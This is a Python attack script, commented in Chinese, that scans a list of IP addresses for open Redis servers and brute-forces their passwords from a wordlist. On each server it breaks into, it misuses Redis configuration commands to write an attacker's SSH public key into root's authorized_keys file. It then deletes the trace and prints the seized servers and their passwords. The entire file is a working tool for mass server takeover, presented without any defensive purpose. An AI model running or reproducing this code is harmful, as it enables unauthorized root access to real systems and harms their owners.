#!/usr/bin/env python 
# -*- coding:utf-8 -*-
# coding:utf-8

import socket
import time
import redis


# 可执行攻击的IP列表
OPEN_LIST = list()
# 成功拿下的权限的服务器地址
SUCCESS_LIST = list()

# 扫描存在可用的服务器
# 开始时间
start_time = time.time()
print("-" * 25, "使用socket扫描主机是否开放某个端口", "-" * 25)
with open(r'C:/Users/侯彦/Desktop/IP库.txt', "rb") as IP_list:  # 读取txt文件
    while True:
        line = IP_list.readline()
        if not line:
            break
        scan_Ip_list = line.decode("utf-8", "ignore").split(" ")  # 解码和切割，切割看你密码库，方式可能不一样


        for IP in scan_Ip_list:
            """使用socket扫描主机是否开放某个端口"""
            # 创建socket
            scan_socket = socket.socket()

            # connect_ex 成功返回0，失败返回errno的值
            if scan_socket.connect_ex((IP, 6379)) == 0:  # 当返回0时, 表示端口开放
                # 记录开放的端口
                OPEN_LIST.append(IP)
                print("{}:{} 这台服务器有redis应用".format(IP, 6379))
            # 必须关闭这个套接字
            scan_socket.close()

# 结束时间
end_time = time.time()
print("-" * 25, "所有目标地址端口扫描结束,扫描的时间为: {}".format(end_time - start_time), "-" * 25)

# 爆破可用服务器的redis密码并保存公钥
print("-" * 25, "开始爆破目标地址redis并提权取得服务器控制权", "-" * 25)
with open(r'C:/Users/侯彦/Desktop/密码库.txt', "rb") as passfile:  # 读取txt文件
    while True:
        line = passfile.readline()
        if not line:
            break
        # 密码本
        linelist = line.decode("utf-8", "ignore").split(" ")  # 解码和切割，切割看你密码库，方式可能不一样

        for ip in OPEN_LIST:
            # 爆破密码
            for password in linelist:
                try:
                    myredis = redis.Redis(host=ip, port=6379, password=password)
                    boolean = myredis.set("pub_key",
                                          "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1MqQfiJKgq6IH7QqVRiVoGE+7Sjc4wbO+k1vIFzWAHoBEl42k2sxvLmSIA+w5Ct9jy6kmV0O9GOW7SWUrI1YuwY89KkhpsHBWoiTg1iUXzcwxFpnL5WhtXAUPyiibvCBxJhPHsBL7vUpgIYytm/fxwuvdqUglgl4P8jbslZlI4CAw/KHmCY4LO9V2QTHdtBge95V94W4lS+zcN/3ueBQGZXmKgo+9wdBDAPW1eS7qYNkvbE0z3d3tB1Zaqxb4+ik3MYDAoV+aIKBC9/9vvBQaeDVMg6oKxTz9VS7u3coWPkcRRsvuWUHsa65myZjcs07+6ovjw8CGpyWTg67D4oeL root@iZ2ze2rdsayx6jj9ekdblfZ\n\n")
                    if boolean:
                        myredis.config_set("dir", "/root/.ssh")

                        myredis.config_set("dbfilename", "authorized_keys")
                        # 数据写回硬盘 authorized_keys 文件中
                        myredis.save()
                        empty_dict = [ip, password]
                        SUCCESS_LIST.append(empty_dict)

                        # 删除设置的key,删除攻击的信息
                        myredis.delete("pub_key")
                        break
                except:
                    pass

        print(SUCCESS_LIST)  # 打印爆破成功的服务器ip和redis密码
        print("-" * 25, "任务完成，取得控制权的服务器IP和redis密码如上", "-" * 25)
